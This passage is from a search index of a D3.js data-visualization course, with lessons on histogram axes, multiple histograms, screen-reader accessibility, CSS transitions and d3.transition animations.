&lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Hmm, we can see the text but it isn't horizontally centered with our line.</p> <p>{width=75%} </p> <p>Let's center our text by adding the CSS property <code>text-anchor: middle</code>. This is a property specifically for setting the horizontal alignment of text in SVG.</p> <p>{lang=javascript,crop-query=.meanLabel} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Perfect! Now our mean line is clear to our readers.</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.07/draw-peripherals/#draw-axes","title":"Draw axes","text":"<p>As usual, our last task here is to draw our axes. But we're in for a treat! Since we're labeling the y value of each of our bars, we won't need a y axis. We just need an x axis and we're set!</p> <p>We'll start by making our axis generator \u2014 our axis will be along the bottom of the chart so we'll be using <code>d3.axisBottom()</code>.</p> <p>{lang=javascript,crop-query=.xAxisGenerator} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>Then we'll use our new axis generator to create an axis, then shift it below our bounds.</p> <p>{lang=javascript,crop-query=.xAxis} &lt;&lt;code/03-making-a-bar-chart/completed/draw-bars.js</p> <p>And lastly, let's throw a label on there to make it clear what the tick labels represent.</p> <pre><code>const xAxisLabel = xAxis.append(\"text\")\n    .attr(\"x\", dimensions.boundedWidth / 2)\n    .attr(\"y\", dimensions.margin.bottom - 10)\n    .attr(\"fill\", \"black\")\n    .style(\"font-size\", \"1.4em\")\n    .text(\"Humidity\")\n</code></pre> <p>And voila, we're done drawing our peripherals!</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.07/draw-peripherals/#set-up-interactions","title":"Set up interactions","text":"<p>Next, we would set up any chart interactions. We don't have any interactions for this chart, but stay tuned \u2014 we'll cover this in the next chapter.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.07/draw-peripherals/#looking-at-our-chart","title":"Looking at our chart","text":"<p>Chart finished! Let's take a look at our distribution.</p> <p>{width=75%} </p> <p>Our histogram looks somewhere in-between a normal and bimodal distribution. Don't worry if those terms make no sense right now \u2014 we cover distribution shapes in detail in Chapter 8 of the book.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.07/draw-peripherals/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.08/extra-credit/","title":"Extra credit","text":"<p>Let's generalize our histogram drawing function and create a chart for each weather metric we have access to! This will make sure that we understand what every line of code is doing.</p> <p>Generalizing our code will also help us to start thinking about handling dynamic data \u2014 a core concept when building a dashboard. Drawing a graph with a specific dataset can be difficult, but you get to rely on values being the same every time your code runs. When handling data from an API, your charting functions need to be more robust and able to handle very different datasets.</p> <p></p> <p>Here's the good news: we won't need to rewrite the majority of our code! The main difference is that we'll wrap most of the chart drawing into a new function called <code>drawHistogram()</code>.</p> <p>Which steps do we need to repeat for every chart? Let's look at our checklist again.</p> <ol> <li>Access data</li> <li>Create dimensions</li> <li>Draw canvas</li> <li>Create scales</li> <li>Draw data</li> <li>Draw peripherals</li> <li>Set up interactions</li> </ol> <p>All of the histograms will use the same dataset, so we can skip step 1. And every chart will be the same size, so we don't need to repeat step 2 either. However, we want each chart to have its own svg element, so we'll need to wrap everything after step 2 .</p> <p>A&gt;In the next section, we'll cover ways to make our chart more accessible. We'll be working on the current version of our histogram - make a copy of your current finished histogram in order to come back to it later.</p> <p>Let's do that \u2014 we'll create a new function called <code>drawHistogram()</code> that contains all of our code, starting at the point we create our svg. Note that the finished code for this step is in the <code>/code/03-making-a-bar-chart/completed-multiple/draw-bars.js</code> file if you're unsure about any of these steps.</p> <pre><code>const drawHistogram = () =&gt; {\n    const wrapper = d3.select(\"#wrapper\")\n    // ...  the rest of our chart code\n</code></pre> <p>What parameters does our function need? The only difference between these charts is the metric we're plotting, so let's add that as an argument.</p> <pre><code>const drawHistogram = metric =&gt; {\n    // ...\n</code></pre> <p>But wait, we need to use the metric to update our <code>metricAccessor()</code>. Let's grab our accessor functions from our Access data step and throw them at the top of our new function. We'll also need our <code>metricAccessor()</code> to return the provided metric, instead of hard-coding <code>d.humidity</code>.</p> <pre><code>const drawHistogram = metric =&gt; {\n    const metricAccessor = d =&gt; d[metric]\n    const yAccessor = d =&gt; d.length\n\n    const wrapper = d3.select(\"#wrapper\")\n    // ...\n</code></pre> <p>Great, let's give it a go! At the bottom of our <code>drawBars()</code> function, let's run through some of the available metrics (see code example for a list) and pass each of them to our new generalized function.</p> <pre><code>const metrics = [\n    \"windSpeed\",\n    \"moonPhase\",\n    \"dewPoint\",\n    \"humidity\",\n    \"uvIndex\",\n    \"windBearing\",\n    \"temperatureMin\",\n    \"temperatureMax\",\n]\n\nmetrics.forEach(drawHistogram)\n</code></pre> <p>Alright! Let's see what happens when we refresh our webpage.</p> <p></p> <p>We see multiple histograms, but something is off. Not all of these charts are showing Humidity! Let's find the line where we set our x axis label and update that to show our metric instead. Here it is:</p> <pre><code>const xAxisLabel = xAxis.append(\"text\")\n   //  ...\n    .text(\"Humidity\")\n</code></pre> <p>We'll set the text to our metric instead, and we can also add a CSS <code>text-transform</code> value to help format our metric names. For a production dashboard, we might want to look up a proper label in a metric-to-label map, but this will work in a pinch.</p> <pre><code>const xAxisLabel = xAxis.append(\"text\")\n    // ...\n    .text(metric)\n    .style(\"text-transform\", \"capitalize\")\n</code></pre> <p>When we refresh our webpage, we should see our finished histograms.</p> <p></p> <p>Wonderful!</p> <p>Take a second and observe the variety of shapes of these histograms. What are some insights we can discover when looking at our data in this format?</p> <ul> <li>the\u00a0moon phase\u00a0distribution is flat - this makes sense because it's cyclical, consistently going through the same steps all year.</li> <li>our\u00a0wind speed\u00a0is usually around 3 mph, with a long tail to the right that represents a few very windy days. Some days have no wind at all, with an average wind speed of 0.</li> <li>our max temperatures\u00a0seem almost bimodal, with the mean falling in between two humps. Looks like New York City spends more days with relatively extreme temperatures (30\u00b0F - 50\u00b0F or 70\u00b0F - 90\u00b0F) than with more temperate weather (60\u00b0F).</li> </ul>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.08/extra-credit/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.09/accessibility/","title":"Accessibility","text":"<p>The main goal of any data visualization is for it to be readable. This generally means that we want our elements to be easy to see, text is large enough to read, colors have enough contrast, etc. But what about users who access web pages through screen readers?</p> <p>We can actually make our charts accessible at a basic level, without putting a lot of effort in. Let's update our histogram so that it's accessible with a screen reader.</p> <p>If you want to test this out, download the ChromeVox extension for chrome (or use any other screen reader application). If we test it out on our histogram, you'll notice that it doesn't give much information, other than reading all of the text in our chart. That's not an ideal experience.</p> <p>The main standard for making websites accessible is from WAI-ARIA, the Accessible Rich Internet Applications Suite. WAI-ARIA roles, set using a <code>role</code> attribute, tell the screen reader what type of content an element is.</p> <p>A&gt;We'll be updating our completed single histogram in this section, without the extra credit code.</p> <p>The first thing we can do is to give our <code>&lt;svg&gt;</code> element a <code>role</code> of <code>figure</code>, to alert it that this element is a chart. (This code can go at the bottom of the Draw canvas step).</p> <pre><code>wrapper.attr(\"role\", \"figure\")\n</code></pre> <p>Next, we can make our chart tabbable, by adding a <code>tabindex</code> of <code>0</code>. This will make it so that a user can hit <code>tab</code> to highlight our chart.</p> <p>A&gt;There are only two <code>tabindex</code> values that you should use: A&gt; A&gt;1. <code>0</code>, which puts an element in the tab flow, in DOM order A&gt;2. <code>-1</code>, which takes an element out of the tab flow.</p> <pre><code>wrapper.attr(\"role\", \"figure\")\n    .attr(\"tabindex\", \"0\")\n</code></pre> <p>When a user tabs to our chart, we want the screen reader to announce the basic layout so the user knows what they're \"looking\" at. To do this, we can add a <code>&lt;title&gt;</code> SVG component with a short description.</p> <pre><code>wrapper.append(\"title\")\n    .text(\"Histogram looking at the distribution of humidity in 2016\")\n</code></pre> <p>If you have a screen reader set up, you'll notice that it will read our <code>&lt;title&gt;</code> when we tab to our chart. The \"highlighted\" state will look something like this:</p> <p>{width=75%} </p> <p>Next, we'll want to make our <code>binsGroup</code> selectable by also giving it a <code>tabindex</code> of <code>0</code>. If the user presses <code>tab</code> after the <code>wrapper</code> is focused, the browser will focus on the <code>binsGroup</code> because it's the next element (in DOM order) that is focusable.</p> <pre><code>const binsGroup = bounds.append(\"g\")\n    .attr(\"tabindex\", \"0\")\n</code></pre> <p>We can also give our <code>binsGroup</code> a <code>role</code> of <code>\"list\"</code>, which will make the screen reader announce the number of items within the list. And we'll let the user know what the list contains by adding an <code>aria-label</code>.</p> <pre><code>const binsGroup = bounds.append(\"g\")\n    .attr(\"tabindex\", \"0\")\n    .attr(\"role\", \"list\")\n    .attr(\"aria-label\", \"histogram bars\")\n</code></pre> <p>Now when our <code>binsGroup</code> is highlighted, the screen reader will announce: \"histogram bars. List with 15 items\". Perfect!</p> <p>Let's annotate each of our \"list items\". After we create our <code>binGroups</code>, we'll add a few attributes to each group:</p> <ol> <li>make it focusable with a <code>tabindex</code> of <code>0</code></li> <li>give it a <code>role</code> of <code>\"listitem\"</code></li> <li>give it an <code>area-label</code> that the screen reader will announce when the item is focused.</li> </ol> <pre><code>const binGroups = binsGroup.selectAll(\"g\")\n  .data(bins)\n  .enter().append(\"g\")\n    .attr(\"tabindex\", \"0\")\n    .attr(\"role\", \"listitem\")\n    .attr(\"aria-label\", d =&gt; `There were ${\n      yAccessor(d)\n    } days between ${\n      d.x0.toString().slice(0, 4)\n    } and ${\n      d.x1.toString().slice(0, 4)\n    } humidity levels.`)\n</code></pre> <p>Now when we tab out of our <code>binsGroup</code>, it will focus the first bar group (and subsequent ones when we tab) and announce our aria label.</p> <p>We'll tackle one last issue \u2014 you might have noticed that the screen reader reads each of our x-axis tick labels once it's done reading our <code>&lt;title&gt;</code>. This is pretty annoying, and not giving the user much information. Let's prevent that.</p> <p>At the bottom of our <code>drawBars()</code> function, let's select all of the text within our chart and give it an <code>aria-hidden</code> attribute of <code>\"true\"</code>.</p> <pre><code>wrapper.selectAll(\"text\")\n   .attr(\"role\", \"presentation\")\n   .attr(\"aria-hidden\", \"true\")\n</code></pre> <p>Great! Now our screen reader will read only our labels and ignore any <code>&lt;text&gt;</code> elements within our chart.</p> <p>With just a little effort, we've made our chart accessible to any users who access the web through a screen reader. That's wonderful, and more than most online charts can say!</p> <p>Next up, we'll get fancy with animations and transitions.</p>"},{"location":"datav/codes/code/course-full/module_02/lesson_02.09/accessibility/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_02/lesson_02.10/exercise-week-3/","title":"This week's exercise","text":"<p>Awesome work getting through our third week! During this week, make a totally new histogram! Here's our list of fun datasets, if you wanted to switch from last week.</p> <p>Choose a dataset to play with -- you'll want to pick one with one metric whose distribution you're especially interested in. Here are a few suggestions:</p> <ul> <li>look at the distribution of number of unique colors in Bob Ross paintings</li> <li>look at the distribution of deaths in witch trials. Extra credit: make multiple histograms to see how this changed across centuries</li> <li>look at the distribution of penguin weight. Extra credit: make multiple histograms to compare weight distributions for different species</li> </ul> <p>Fork our histogram CodeSandbox, download the data, and import it into your new forked sandbox.</p> <p>A&gt; If the data is a csv file, you'll need to use <code>d3.csv()</code> instead of <code>d3.json()</code>.</p> <p>Now, go over the same steps we went through this week to make a histogram with this new data.</p> <p>If you get stuck, watch this week's videos again or post a question inline or on the Discord channel. Good luck! We're rooting for you!</p> <p>And once you're finished, show off your wonderful custom visualization on Twitter or on the Discord! We'd love to see it!</p>"},{"location":"datav/codes/code/course-full/module_03/lesson_03.00/animations-and-transitions/","title":"Animations and Transitions","text":"<p>When we update our charts, we can animate elements from their old to their new positions. These animations can be visually exciting, but more importantly, they have functional benefits. When a bar animates from one height to another, the viewer has a better idea of whether it's getting larger or smaller. If we're animating several bars at once, we're drawing the viewer's eye to the bar making the biggest change because of its fast speed.</p> <p>By analogy, imagine if track runners teleported from the start to the finish line. For one, it would be terribly boring to watch, but it would also be hard to tell who was fastest.</p> <p>There are multiple ways we can animate changes in our graphs:</p> <ul> <li>using SVG <code>&lt;animate&gt;</code></li> <li>using CSS <code>transition</code></li> <li>using <code>d3.transition()</code></li> </ul> <p>Let's introduce each of these options.</p>"},{"location":"datav/codes/code/course-full/module_03/lesson_03.00/animations-and-transitions/#svg-animate","title":"SVG <code>&lt;animate&gt;</code>","text":"<p><code>&lt;animate&gt;</code> is a native SVG element that can be defined inside of the animated element.</p> <pre><code>&lt;svg width=\"120\" height=\"120\"&gt;\n  &lt;rect x=\"10\" y=\"10\" width=\"100\" height=\"100\" fill=\"cornflowerblue\"&gt;\n    &lt;animate\n      attributeName=\"x\"\n      values=\"0;20;0\"\n      dur=\"2s\"\n      repeatCount=\"indefinite\"\n    /&gt;\n    &lt;animate\n      attributeName=\"fill\"\n      values=\"cornflowerBlue;maroon;cornflowerBlue\"\n      dur=\"6s\"\n      repeatCount=\"indefinite\"\n    /&gt;\n  &lt;/rect&gt;\n&lt;/svg&gt;\n</code></pre> <p></p> <p>Unfortunately this won't work for our charts. For one, <code>&lt;animate&gt;</code> is unsupported in Internet Explorer, and its future is uncertain. But the bigger issue is that we would have to set a static start and end value. We don't want to define static animations, instead we want our elements to animate changes between two dynamic values. Luckily, we have other options.</p>"},{"location":"datav/codes/code/course-full/module_03/lesson_03.01/css-transitions/","title":"CSS transitions","text":"<p>Many of our chart changes can be transitioned with the CSS <code>transition</code> property. When we update a <code>&lt;rect&gt;</code> to have a fill of red instead of blue, we can specify that the color change take 10 seconds instead of being instantaneous. During those 10 seconds, the <code>&lt;rect&gt;</code> will continuously re-draw with intermediate colors on the way to red.</p> <p>Let's try out an example! In our example, you'll see a blue box that moves and turns green on hover.</p> <p>{width=75%} </p> <p>Let's open up the</p> <p><code>styles.css</code> file to take a look at what's going on. We can see our basic styles for the box.</p> <pre><code>.box {\n    background: cornflowerblue;\n    height: 100px;\n    width: 100px;\n}\n</code></pre> <p>And our styles that apply to our box when it is hovered (change the background color and move it 30 pixels to the right).</p> <pre><code>.box:hover {\n    background: yellowgreen;\n    transform: translateX(30px);\n}\n</code></pre> <p>To create CSS a transition, we need to specify how long we want the animation to take with the <code>transition-duration</code> property. The property value accepts time CSS data types \u2014 a number followed by either <code>s</code> (seconds) or <code>ms</code> (milliseconds).</p> <p>Let's make our box changes animate over one second.</p> <pre><code>.box {\n    background: cornflowerblue;\n    height: 100px;\n    width: 100px;\n    transition-duration: 1s;\n}\n</code></pre> <p>Now when we hover over the box, we can see it slowly move to the right and turn green. Smooth!</p> <p>{width=75%} </p> <p>Now let's say that we only want to animate our box's movement, but we want the color change to happen instantaneously. This is possible by specifying the <code>transition-property</code> CSS property. By default, <code>transition-property</code> is set to <code>all</code>, which animates all transitions. Instead, let's override the default and specify a specific CSS property name (<code>transform</code>).</p> <pre><code>.box {\n    background: cornflowerblue;\n    height: 100px;\n    width: 100px;\n    transition-duration: 1s;\n    transition-property: transform;\n}\n</code></pre> <p>Now our box instantly turns green, but still animates to the right.</p> <p>{width=75%} </p> <p>Instead of setting <code>transition-duration</code> and <code>transition-property</code> separately, we can use the shorthand property: <code>transition</code>. Shorthand CSS properties let you set multiple properties in one line. When we give <code>transition</code> a CSS property name and duration (separated by a space), we are setting both <code>transition-duration</code> and <code>transition-property</code>. Let's try it out.</p> <pre><code>.box {\n    background: cornflowerblue;\n    height: 100px;\n    width: 100px;\n    transition: transform 1s;\n}\n</code></pre> <p><code>transition</code> will accept a third property (<code>transition-timing-function</code>) that sets the acceleration curve for the animation. The animation could be linear (the default), slow then fast (<code>ease-in</code>), in steps (<code>steps(6)</code>), or even a custom function (<code>cubic-bezier(0.1, 0.7, 1.0, 0.1)</code>), among other options. Let's see what <code>steps(6)</code> looks like \u2014 it should break the animation into 6 discrete steps.</p> <pre><code>.box {\n    background: cornflowerblue;\n    height: 100px;\n    width: 100px;\n    transition: transform 1s steps(6);\n}\n</code></pre> <p>What if we wanted to animate the color change, but finish turning green while our box is shifting to the right? <code>transition</code>\u00a0will accept multiple transition statements, we just need to separate them by a comma. Let's add a transition for the\u00a0<code>background</code>\u00a0color.</p> <pre><code>.box {\n    background: cornflowerblue;\n    height: 100px;\n    width: 100px;\n    transition: transform 1s steps(6),\n                background 2s ease-out;\n}\n</code></pre> <p>Nice! Now our box transitions by stepping to the right, while turning green over two seconds. Chrome's dev tools have a great way to visualize this transition. Press\u00a0<code>esc</code>\u00a0when looking at the\u00a0Elements\u00a0panel to bring up the bottom panel. In the bottom panel, we can open up the\u00a0Animations\u00a0tab.</p> <p>A&gt;If you don't see the Animations tab, click on the kebab menu on the left and select it from the dropdown options.</p> <p></p> <p>Once we've triggered our box transition by hovering, we can inspect the animation.</p> <p></p> <p>We can see the <code>transform</code> transition on top, with six discrete changes, and the <code>background</code> animation on the bottom, easing gradually from one color to the next. The <code>background</code> transition diagram is twice as wide as the <code>transform</code> transition diagram, indicating that it takes twice as long.</p> <p>This view can be very handy when inspecting, tweaking, and debugging transitions.</p> <p>Now that we're comfortable with CSS <code>transition</code>, let's see how we might use it to animate our charts.</p> <p>A&gt;Not all properties can be animated. For example, how would you animate changing a label from Humidity to Dew point? However most properties can be animated, so feel free to operate under the assumption that a property can be animated until proven otherwise.</p>"},{"location":"datav/codes/code/course-full/module_03/lesson_03.01/css-transitions/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_03/lesson_03.02/css-transitions/","title":"CSS transitions with a chart","text":""},{"location":"datav/codes/code/course-full/module_03/lesson_03.02/css-transitions/#css-transition-with-a-chart","title":"CSS transition with a chart","text":"<p>In this example, the <code>index.html</code> is importing a CSS stylesheet (<code>styles.css</code>) and the <code>chart.js</code> file, which is an updated version of our histogram drawing code from Module 3.</p> <p></p> <p>The code should look mostly familiar, but you might notice a few changes. Don't worry about those changes at the moment \u2014 they're not important to our main mission.</p> <p>Let's look inside that <code>styles.css</code> file. We can see that we have already set the basic styles for our bars (<code>.bin rect</code>), bar labels (<code>.bin text</code>), mean line (<code>.mean</code>), and x axis label (<code>.x-axis-label</code>).</p> <p>Great! Now that we know the lay of the land, let's look at our example \u2014 we should see our histogram and a\u00a0Change metric\u00a0button.</p> <p></p> <p>When we click the button, our chart re-draws with the next metric, but the change is instantaneous.</p> <p></p> <p>Does this next metric have fewer bars than the previous one? Does our mean line move to the left or the right? These questions can be answered more easily if we transition gradually from one view to the other.</p> <p>Let's add an animation whenever our bars update (<code>.bin rect</code>).</p> <pre><code>.bin rect {\n    fill: cornflowerblue;\n    transition: all 1s ease-out;\n}\n</code></pre> <p>A&gt;Note that this CSS transition will currently only work in the Chrome browser. This is because Chrome is the only browser that has implemented the part of the SVG 2 spec which allows <code>height</code> as a CSS property, letting us animate the transition.</p> <p>Now when we update our metric, our bars shift slowly to one side while changing height \u2014 we can see that their <code>width</code>, <code>height</code>, <code>x</code>, and <code>y</code> values are animating. This may be fun to watch, but it doesn't really represent our mental model of bar charts. It would make more sense for the bars to change position instantaneously and animate any height differences. Let's only transition the <code>height</code> and <code>y</code> values.</p> <pre><code>.bin rect {\n    fill: cornflowerblue;\n    transition: height 1s ease-out,\n                     y 1s ease-out;\n}\n</code></pre> <p>A&gt;<code>ease-out</code> is a good starting point for CSS transitions \u2014 it starts quickly and slows down near the end of the animation to ease into the final value. It won't be ideal in every case, but it's generally a good choice.</p> <p>That's better! Now we can see whether each bar is increasing or decreasing.</p> <p></p> <p>Our transitions are still looking a bit disjointed with our text changing position instantaneously. Let's try to animate our text position, too.</p> <pre><code>.bin text {\n    transition: y 1s ease-out;\n}\n</code></pre> <p>Hmm, our text position is still not animating \u2014 it seems as if <code>y</code> isn't a transition-able property. Thankfully there is a workaround here \u2014 we can position the text using a CSS property instead of changing its <code>y</code> attribute.</p> <p>Switching over to our <code>chart.js</code> file, let's position our bar labels using <code>translateY()</code>.</p> <pre><code>    const barText = binGroups.select(\"text\")\n        .attr(\"x\", d =&gt; xScale(d.x0) + (xScale(d.x1) - xScale(d.x0)) / 2)\n        .attr(\"y\", 0)\n        .style(\"transform\", d =&gt; `translateY(${\n          yScale(yAccessor(d)) - 5\n        }px)`)\n        .text(d =&gt; yAccessor(d) || \"\")\n</code></pre> <p>A&gt;Note that we're filling our <code>&lt;text&gt;</code> elements with empty strings instead of <code>0</code> (with <code>.text(d =&gt; yAccessor(d) || \"\")</code>) to prevent labeling empty bars.</p> <p>We'll also need to change the transition property to target <code>transform</code>.</p> <pre><code>.bin text {\n    transition: transform 1s ease-out;\n}\n</code></pre> <p>Now our bar labels are animating with our bars. Perfect!</p> <p>Let's make one last change - we want our dashed mean line to animate when it moves left or right. We could try to <code>transition</code> changes to <code>x1</code> and <code>x2</code>, but those aren't CSS properties, they're SVG attributes. Let's position the line's horizontal position with the <code>transform</code> property.</p> <pre><code>const meanLine = bounds.selectAll(\".mean\")\n    .attr(\"y1\", -20)\n    .attr(\"y2\", dimensions.boundedHeight)\n    .style(\"transform\", `translateX(${xScale(mean)}px)`)\n</code></pre> <p>We'll also add the <code>transition</code> CSS property in our <code>styles.css</code> file:</p> <pre><code>.mean {\n    stroke: maroon;\n    stroke-dasharray: 2px 4px;\n    transition: transform 1s ease-out;\n}\n</code></pre> <p>These updates are looking great!</p> <p>There are some animations that aren't possible with CSS transitions. For example, transitioning the x axis changes would help us see if the values for our new metric have increased or decreased. Using a CSS transition won't help here \u2014 CSS has no way of knowing whether a tick mark with the text <code>10</code> is larger than a tick mark with the text <code>100</code>. Let's bring out the heavier cavalry.</p>"},{"location":"datav/codes/code/course-full/module_03/lesson_03.02/css-transitions/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_03/lesson_03.03/d3-transition/","title":"d3.transition","text":"<p>CSS transitions have our back for simple property changes, but for more complex animations we'll need to use <code>d3.transition()</code> from the d3-transition module. When would we want to use <code>d3.transition()</code> instead of CSS transitions?</p> <ul> <li>When we want to ensure that multiple animations line up</li> <li>When we want to do something when the animation ends (for example starting another animation)</li> <li>When the property we want to animate isn't a CSS property (remember when we tried to animate our bars' heights but had to use <code>transform</code> instead? <code>d3.translate</code> can animate non-CSS property changes.)</li> <li>When we want to synchronize adding and removing elements with animations</li> <li>When we might interrupt halfway through a transition</li> <li>When we want a custom animation (for example, we could write a custom interpolator for changing text that adds new letters one-by-one)</li> </ul> <p>Let's get our hands dirty by re-implementing the CSS transitions for our histogram.</p> <p></p> <p>Let's again start by animating any changes to our bars. Instead of adding a <code>transition</code> property to our <code>styles.css</code> file, we'll start in the <code>chart.js</code> file where we set our <code>barRects</code> attributes.</p> <p>As a reminder, when we run:</p> <pre><code>const barRects = binGroups.select(\"rect\")\n</code></pre> <p>we're creating a d3 selection object that contains all <code>&lt;rect&gt;</code> elements. Let's log that to the console as a refresher of what a selection object looks like.</p> <pre><code>const barRects = binGroups.select(\"rect\")\n        .attr(\"x\", d =&gt; xScale(d.x0) + barPadding)\n        .attr(\"y\", d =&gt; yScale(yAccessor(d)))\n        .attr(\"height\", d =&gt; dimensions.boundedHeight\n            - yScale(yAccessor(d))\n        )\n        .attr(\"width\", d =&gt; d3.max([\n          0,\n          xScale(d.x1) - xScale(d.x0) - barPadding\n        ]))\n\nconsole.log(barRects)\n</code></pre> <p></p> <p>We can use the <code>.transition()</code> method on our d3 selection object to transform our selection object into a d3 transition object.</p> <pre><code>const barRects = binGroups.select(\"rect\")\n    .transition()\n        .attr(\"x\", d =&gt; xScale(d.x0) + barPadding)\n        .attr(\"y\", d =&gt; yScale(yAccessor(d)))\n        .attr(\"height\", d =&gt; dimensions.boundedHeight\n          - yScale(yAccessor(d))\n        )\n        .attr(\"width\", d =&gt; d3.max([\n          0,\n          xScale(d.x1) - xScale(d.x0) - barPadding\n        ]))\n\nconsole.log(barRects)\n</code></pre> <p></p> <p>d3 transition objects look a lot like selection objects, with a\u00a0<code>_groups</code>\u00a0list of relevant DOM elements and a\u00a0<code>_parents</code>\u00a0list of ancestor elements. They have two additional keys: <code>_id</code> and <code>_name</code>, but that's not all that has changed.</p> <p>{pagebreak}</p> <p>Let's expand the <code>__proto__</code> of our transition object.</p> <p>A&gt;<code>__proto__</code> is a native property of JavaScript objects that exposes methods and values that this specific object has inherited. If you're unfamiliar with JavaScript Prototypal Inheritance and want to read up, the MDN docs are a good place to start.</p> <p>A&gt;In this case, we can see that the <code>__proto__</code> property contains d3-specific methods, and the nested <code>__proto__</code> object contains native object methods, such as <code>toString()</code>.</p> <p></p> <p>We can see that some methods are inherited from d3 selection objects (eg. <code>.call()</code> and <code>.each()</code>), but most are overwritten by new transition methods. When we click the Change metric button now, we can see that our bar changes are animated. This makes sense \u2014 any <code>.attr()</code> updates chained after a <code>.transition()</code> call will use transition's <code>.attr()</code> method, which attempts to interpolate between old and new values.</p> <p>Something looks strange though - our new bars are flying in from the top left corner.</p> <p></p> <p>A&gt;Note that d3 transitions animate over 0.25 seconds \u2014 we'll learn how to change that in a minute!</p> <p>Knowing that <code>&lt;rect&gt;</code>s are drawn in the top left corner by default, this makes sense. But how do we prevent this?</p> <p>Remember how we can isolate new data points with <code>.enter()</code>? Let's find the line where we're adding new <code>&lt;rect&gt;</code>s and set their initial values. We want them to start in the right horizontal location, but be 0 pixels tall so we can animate them \"growing\" from the x axis.</p> <p>Let's also have them be green to start to make it clear which bars we're targeting. We'll need to set the fill using an inline style using <code>.style()</code> instead of setting the attribute in order to override the CSS styles in <code>styles.css</code>.</p> <pre><code>newBinGroups.append(\"rect\")\n        .attr(\"height\", 0)\n        .attr(\"x\", d =&gt; xScale(d.x0) + barPadding)\n        .attr(\"y\", dimensions.boundedHeight)\n        .attr(\"width\", d =&gt; d3.max([\n          0,\n          xScale(d.x1) - xScale(d.x0) - barPadding\n        ]))\n        .style(\"fill\", \"yellowgreen\")\n</code></pre> <p>A&gt;Why are we using <code>.style()</code> instead of <code>.attr()</code> to set the fill? We need the <code>fill</code> value to be an inline style instead of an SVG attribute in order to override the CSS styles in <code>styles.css</code>. The way CSS specificity works means that inline styles override class selector styles, which override SVG attribute styles.</p> <p>Once our bars are animated in, they won't be new anymore. Let's transition their fill to blue. Luckily, chaining d3 transitions is really simple \u2014 to add a new transition that starts after the first one ends, add another <code>.transition()</code> call.</p> <pre><code>const barRects = binGroups.select(\"rect\")\n    .transition()\n        .attr(\"x\", d =&gt; xScale(d.x0) + barPadding)\n        .attr(\"y\", d =&gt; yScale(yAccessor(d)))\n        .attr(\"height\", d =&gt; dimensions.boundedHeight\n          - yScale(yAccessor(d))\n        )\n        .attr(\"width\", d =&gt; d3.max([\n          0,\n          xScale(d.x1) - xScale(d.x0) - barPadding\n        ]))\n    .transition()\n        .style(\"fill\", \"cornflowerblue\")\n</code></pre> <p></p> <p>Let's slow things down a bit so we can bask in these fun animations. d3 transitions default to 0.25 seconds, but we can specify how long an animation takes by chaining <code>.duration()</code> with a number of milliseconds.</p> <pre><code>const barRects = binGroups.select(\"rect\")\n    .transition().duration(600)\n        .attr(\"x\", d =&gt; xScale(d.x0) + barPadding)\n        // ...\n</code></pre> <p></p> <p>Smooth! Now that our bars are nicely animated, it's jarring when our text moves to its new position instantly. Let's add another transition to make our text transition with our bars.</p> <pre><code>const barText = binGroups.select(\"text\")\n    .transition().duration(600)\n        .attr(\"x\", d =&gt; xScale(d.x0)\n          + (xScale(d.x1) - xScale(d.x0)) / 2\n        )\n        .attr(\"y\", d =&gt; yScale(yAccessor(d)) - 5)\n        .text(d =&gt; yAccessor(d) || \"\")\n</code></pre> <p>We'll also need to set our labels' initial position (higher up in our code) to prevent them from flying in from the left.</p> <pre><code>newBinGroups.append(\"text\")\n        .attr(\"x\", d =&gt; xScale(d.x0)\n          + (xScale(d.x1) - xScale(d.x0)) / 2\n        )\n        .attr(\"y\", dimensions.boundedHeight)\n</code></pre> <p>Here's a fun tip: we can specify a timing function (similar to CSS's transition-timing-function) to give our animations some life. They can look super fancy, but we only need to chain <code>.ease()</code> with a d3 easing function. Check out the full list at the d3-ease repo.</p> <pre><code>const barRects = binGroups.select(\"rect\")\n    .transition().duration(600).ease(d3.easeBounceOut)\n        .attr(\"x\", d =&gt; xScale(d.x0) + barPadding)\n        // ...\n</code></pre> <p>That's looking groovy, but our animation is out of sync with our labels again. We could ease our other transition, but there's an easier (no pun intended) way to sync multiple transitions.</p> <p>By calling <code>d3.transition()</code>, we can make a transition on the root document that can be used in multiple places. Let's create a root transition \u2014 we'll need to place this definition above our existing transitions, for example after we define <code>barPadding</code>. Let's also log it to the console to take a closer look.</p> <pre><code>const barPadding = 1\n\nconst updateTransition = d3.transition()\n    .duration(600)\n    .ease(d3.easeBackIn)\n\nconsole.log(updateTransition)\n</code></pre> <p>If we expand the <code>_groups</code> array, we can see that this transition is indeed targeting our root <code>&lt;html&gt;</code> element.</p> <p></p> <p>A&gt;You'll notice errors in the dev tools console that say <code>Error: &lt;rect&gt; attribute height: A negative value is not valid.</code>. This happens with the <code>d3.easeBackIn</code> easing we're using, which causes the bars to bounce below the x axis when they animate.</p> <p>Let's update our bar transition to use <code>updateTransition</code> instead of creating a new transition. We can do this by passing the existing transition in our <code>.transition()</code> call.</p> <pre><code>const barRects = binGroups.select(\"rect\")\n    .transition(updateTransition)\n        .attr(\"x\", d =&gt; xScale(d.x0) + barPadding)\n        // ...\n</code></pre> <p>Let's use <code>updateTransition</code> for our text, too.</p> <pre><code>const barText = binGroups.select(\"text\")\n    .transition(updateTransition)\n        .attr(\"x\", d =&gt; xScale(d.x0)\n          + (xScale(d.x1) - xScale(d.x0)) / 2\n        )\n        // ...\n</code></pre> <p>We can use this transition as many times as we want \u2014 let's also animate our mean line when it updates.</p> <pre><code>const meanLine = bounds.selectAll(\".mean\")\n    .transition(updateTransition)\n        .attr(\"x1\", xScale(mean))\n        // ...\n</code></pre> <p>And our 